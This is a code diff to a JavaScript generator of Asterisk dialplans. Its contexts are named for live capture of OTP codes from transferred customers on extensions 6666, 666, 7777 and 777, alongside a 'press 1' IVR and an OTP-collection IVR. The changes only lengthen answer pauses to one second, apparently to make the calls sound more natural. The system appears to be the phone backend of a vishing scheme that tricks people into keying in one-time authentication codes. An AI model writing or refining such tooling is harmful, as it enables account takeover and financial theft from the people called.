@@ -679,7 +679,7 @@ function generateCleanDialplanConf(
   dialplanContent += `; 2a. Extension Dedicada de Captura OTP al Transferir (Extension 6666)\n`;
   dialplanContent += `exten => 6666,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 6666 ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(0.2)\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
   dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
   dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
@@ -697,7 +697,7 @@ function generateCleanDialplanConf(
 
   dialplanContent += `exten => 666,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 666 ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(0.2)\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
   dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
   dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
@@ -716,7 +716,7 @@ function generateCleanDialplanConf(
   dialplanContent += `; 2a. Extension Dedicada de Captura OTP al Transferir (Extension 7777)\n`;
   dialplanContent += `exten => 7777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 7777 ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(0.5)\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
   dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
   dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
@@ -733,7 +733,7 @@ function generateCleanDialplanConf(
 
   dialplanContent += `exten => 777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 777 ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(0.5)\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
   dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
   dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
@@ -834,7 +834,7 @@ function generateCleanDialplanConf(
   dialplanContent += `[ivr-captura-vivo]\n`;
   dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-7777] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(0.5)\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${CALLING_AGENT}))\n`;
@@ -981,7 +981,7 @@ function generateCleanDialplanConf(
   dialplanContent += `[ivr-captura-vivo-6666]\n`;
   dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-6666] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(0.2)\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${CALLING_AGENT}))\n`;
@@ -1104,9 +1104,9 @@ function generateCleanDialplanConf(
   dialplanContent += `; CONTEXTO DEDICADO PRESS-1: RESPUESTA ULTRA-RAPIDA AL 1\n`;
   dialplanContent += `; ========================================================\n`;
   dialplanContent += `[ivr-press1]\n`;
-  dialplanContent += `exten => s,1,NoOp(=== [IVR-PRESS1] INICIO MODO PRESS 1 ULTRA-RAPIDO ===)\n`;
+  dialplanContent += `exten => s,1,NoOp(=== [IVR-PRESS1] INICIO MODO PRESS 1 CON PAUSA CORTESIA 1S ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(0.1)\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(response)=4)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
@@ -1149,7 +1149,7 @@ function generateCleanDialplanConf(
   dialplanContent += `[ivr-otp]\n`;
   dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(0.1)\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(response)=4)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
